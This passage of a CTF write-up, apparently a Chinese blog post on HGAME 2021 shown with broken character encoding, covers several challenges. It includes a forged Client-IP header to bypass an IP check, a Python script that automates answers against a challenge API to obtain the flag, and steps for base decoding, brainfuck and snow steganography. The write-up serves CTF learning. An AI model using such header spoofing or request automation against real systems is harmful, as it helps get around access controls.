30Host: thief.0727.siteClient-IP: 127.0.0.11</code></pre><img src="/article/hgame2021/image-20210206161847925.png" class="" title="image-20210206161847925" loading="lazy"><hr><h3 id="æ™ºå•†æ£€æµ‹é¸¡"><a href="#æ™ºå•†æ£€æµ‹é¸¡" class="headerlink" title="æ™ºå•†æ£€æµ‹é¸¡"></a>æ™ºå•†æ£€æµ‹é¸¡</h3><p>é¢˜ç›®æè¿°ï¼š åˆæœ‰è°ä¸çˆ±é«˜æ•°å‘¢ï¼Ÿåæ­£æˆ‘ä¸çˆ±ï¼ˆè¯·ä½¿ç”¨firefoxæµè§ˆå™¨æ‰“å¼€é¢˜ç›®ï¼‰ </p><p>é¢˜ç›®åœ°å€ï¼š <a href="http://r4u.top:5000/">http://r4u.top:5000/</a> </p><p>åˆåˆ°äº†å†™è„šæœ¬ç¯èŠ‚ï¼Œé¦–å…ˆçœ‹ä¸‹é¢˜ç›®</p><img src="/article/hgame2021/image-20210206162112398.png" class="" title="image-20210206162112398" loading="lazy"><p>æˆ‘å¤§æ¦‚æ˜¯å‡çš„å¤§å­¦ç”Ÿ</p><p>å…ˆæ‰¾é¢˜ç›®ï¼Œå…¨æ˜¯ax+bçš„å½¢å¼ï¼Œé‚£å°±æŒºå¥½åŠçš„ï¼Œæ‰¾æºç çœ‹çœ‹æ€ä¹ˆå–æ•°å­—</p><img src="/article/hgame2021/image-20210206162233545.png" class="" title="image-20210206162233545" loading="lazy"><p>åº”è¯¥è¿˜æ˜¯æŒºå¥½å–çš„ï¼Œä½†æ˜¯å¼€å§‹å†™è„šæœ¬å‘ç°GETè¯·æ±‚ä¸åˆ°ï¼Œåº”è¯¥æ˜¯å¯¹æ¥apiçš„ï¼Œæœç„¶åœ¨Sourcesé‡Œé¢æ‰¾åˆ°äº†ä¸ª<code>fuckmath.js</code></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span><span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getStatus"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> solving <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'solving'</span><span class="token punctuation">]</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#status"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>solving<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>solving <span class="token operator">===</span> <span class="token number">100</span><span class="token punctuation">)</span>                <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>            withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#integral'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'question'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        type<span class="token operator">:</span> <span class="token string">"GET"</span><span class="token punctuation">,</span>        url<span class="token operator">:</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">,</span>        dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>        <span class="token function-variable function">success</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">getQuestion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    type<span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>    url<span class="token operator">:</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span>    data<span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>answer<span class="token operator">:</span><span class="token function">parseFloat</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#answer'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    dataType<span class="token operator">:</span> <span class="token string">"json"</span><span class="token punctuation">,</span>    contentType<span class="token operator">:</span> <span class="token string">"application/json;charset=utf-8"</span><span class="token punctuation">,</span>    xhrFields<span class="token operator">:</span> <span class="token punctuation">&#123;</span>        withCredentials<span class="token operator">:</span> <span class="token boolean">true</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    crossDomain<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token function-variable function">success</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-success">\n                    &lt;strong>Right!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#alert'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>åº”è¯¥æ˜¯é€šè¿‡<code>./api/getStatus</code>æ£€æŸ¥åšé¢˜æƒ…å†µï¼Œ<code>./api/getQuestion</code>åŠ è½½é¢˜ç›®ï¼Œ<code>./api/verify</code>äº¤ç­”æ¡ˆï¼Œæœ€å<code>./api/getFlag</code>æ‹¿flag</p><p>ç›´æ¥è®¿é—®<code>./api/getFlag</code>çœ‹çœ‹ï¼Ÿ</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>è¢«éª‚äº†555â€¦åº”è¯¥æ˜¯æ£€æŸ¥sessionçœ‹åšé¢˜æƒ…å†µï¼Œå…¶ä»–éƒ½è®¿é—®ä¸€ä¸‹çœ‹çœ‹</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>æœ€åç¡®è®¤ç­”æ¡ˆæ˜¯<code>answer</code>ï¼Œå¼€å§‹å†™è„šæœ¬</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>èµ¶æ—¶é—´ï¼Œæ²¡ææ­£åˆ™ï¼Œå‡‘åˆç€ç”¨ç”¨å§ï¼Œè¹©è„šç¼–ç¨‹å‹¿å–·2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/1/30 21:20@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>ä¸€ é”® è· å– flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="èµ°ç§è€…çš„æ„¤æ€’"><a href="#èµ°ç§è€…çš„æ„¤æ€’" class="headerlink" title="èµ°ç§è€…çš„æ„¤æ€’"></a>èµ°ç§è€…çš„æ„¤æ€’</h3><p>é¢˜ç›®æè¿°ï¼š</p><p> <strong>æœ¬é¢˜ä¸ºå®è—èµ°ç§è€…çš„æ›´æ”¹ç‰ˆæœ¬ï¼Œè€ƒç‚¹ç›¸åŒï¼Œè¯·å…ˆåšå‡ºå®è—èµ°ç§è€…</strong><br>Liki æ—¥è®°ï¼š<br>2020å¹´2æœˆ2æ—¥ï¼š<br>ä»Šå¤©è­¦å±€å¯„æ¥ä¸€å°ä¿¡ï¼Œæ˜¯èµ°ç§è€… Switch å¯„æ¥çš„ï¼Œä¿¡é‡Œåªæœ‰ä¸€å¥è¯<br><strong>â€œæˆ‘æœ€è®¨åŒé¡ºé£è½¦ï¼Œæˆ‘å°†å¸¦æ¥æˆ‘çš„æ„¤æ€’â€</strong><br>çœŸæ˜¯è®©äººæ‘¸ä¸ç€å¤´è„‘â€¦â€¦<br>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼ã€‚ </p><p>é¢˜ç›®æè¿°ï¼š <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>åŸå› æ˜¯web3èƒ½ä¸Šè½¦äº†2333</p><p>ç›¸åŒpayloadï¼Œæ”¹æ”¹hostå°±è¡Œ</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQå›¾ç‰‡20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>miscéšç¼˜åšåšäº†ï¼Œä¸€å‘¨ä¸‰åœºæ¯”èµ›æœ‰ç‚¹å¿™</p><hr><h3 id="Baseå…¨å®¶ç¦"><a href="#Baseå…¨å®¶ç¦" class="headerlink" title="Baseå…¨å®¶ç¦"></a>Baseå…¨å®¶ç¦</h3><p>é¢˜ç›®æè¿°ï¼š</p><p>æ–°å¹´å³å°†æ¥ä¸´ä¹‹é™…ï¼ŒBaseå®¶æ—ä¹Ÿå›¢èšäº†ï¼Œä»–ä»¬ç”¨ä»–ä»¬ç‰¹æœ‰çš„æ‰“æ‹›å‘¼æ–¹å¼å‘ä½ é—®äº†ä¸ªå¥½ï¼Œä½ çŸ¥é“ä»–ä»¬åœ¨è¯´ä»€ä¹ˆå—ï¼Ÿ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>æœ¬æ¬¡æ¯”èµ›ä¸ºæ‹›æ–°èµ›ï¼Œè¯·å„ä½é€‰æ‰‹ä¸è¦åœ¨å½“å‘¨æ¯”èµ›è¿›è¡ŒæœŸé—´è‡³ç»“æŸå24å°æ—¶å†…å‘å¸ƒå½“å‘¨æ¯”èµ›é¢˜ç›®çš„writeup</strong> </p><p>é¢˜ç›®åœ°å€ï¼š<a href="https://www.baidu.com/">https://www.baidu.com</a> å¾ˆå¼ºå•Š</p><p>base64+base32+base16 ä¸è§£é‡Š</p><hr><p>åæ§½ä¸‹MISC2</p><p>å‹ç¼©åŒ…å¯†ç çŸ¥é“æ˜¯å•¥å˜›ï¼Ÿ</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333æ²¡é”™å°±æ˜¯çš„</p><p>misc3å¥½åƒæ˜¯æµé‡åŒ…ï¼Œèƒ½æå‡ºæ¥ä¸€å¼ å‡ Mçš„å›¾ç‰‡ï¼Œåˆ†æå›¾ç‰‡</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>é¢˜ç›®æè¿°ï¼š timmixä¸çŸ¥æ‰€è¸ªï¼Œåªç•™ä¸‹äº†ä¸¤ä¸ªwordæ–‡æ¡£ï¼Œä½œä¸ºwordä¸“å®¶çš„ä½ èƒ½å¸®å¿™æ‰¾å‡ºä»–çš„å»å‘å—ï¼Ÿ </p><p>é¢˜ç›®é“¾æ¥ï¼š<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>å…¶å®æˆ‘ä»¥å‰å‡ºè¿‡ä¸€ä¸ªWordçš„Miscï¼Œæœ‰äººè®°å¾—å˜›2333</p><p>ä¸¤ä¸ªwordæ–‡æ¡£ï¼Œå…ˆçœ‹å±æ€§</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>ä¼°è®¡å¦ä¸€ä¸ªæœ‰å¯†ç ï¼Œç›´æ¥ä»¥å‹ç¼©åŒ…å½¢å¼æ‰“å¼€</p><p>å¾ˆè½»æ˜“æœ‰ä¸ª<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>å¾ˆæ˜¾ç„¶brainfuck</p><p>è§£å¯†ç½‘ç«™<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>è§£å¾—<code>DOYOUKNOWHIDDEN?</code></p><p>å¼€ç¬¬äºŒä¸ªæ–‡æ¡£ï¼Œåˆ†æäº†ä¸€ä¸‹ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ–‡æ¡£åªæœ‰ä¸€å¼ å›¾ç‰‡</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>é€‰ä¸­æ–‡æ¡£å‘ç°ä¸å¯¹åŠ²ï¼Œæ˜¾ç¤ºéšè—æ ‡è®°å‘ç°æœ‰éšè—å­—ç¬¦ï¼ŒæŠŠå­—ç¬¦å–æ¶ˆéšè—</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>å‘ç°æ˜¯ç©ºç™½çš„ï¼Œå•ç‹¬ä¿å­˜ä¸‹æ¥</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>ç»“åˆå›¾ç‰‡è·Ÿé›ªæœ‰å…³ï¼Œå¯èƒ½æ˜¯snowåŠ å¯†ï¼Œå»è·‘ä¸€ä¸‹è¯•è¯•</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>ç¡®å®</p><hr><p>å…¶ä»–é¢˜ç›®å¯ä»¥ç­‰å®˜æ–¹æˆ–è€…PWNå¸ˆå‚…çš„WPå•¦ï¼Œæ¯æ¬¡åšé¢˜ä¸ç®¡ç®€å•è¿˜æ˜¯å›°éš¾éƒ½è¦æœ‰æ‰€æ”¶è·ï¼Œweek2å¸ˆå‚…ä»¬ä¹Ÿè¦åŠ æ²¹ï¼æå‰ç¥å¸ˆå‚…ä»¬æ–°å¹´å¿«ä¹ï¼</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
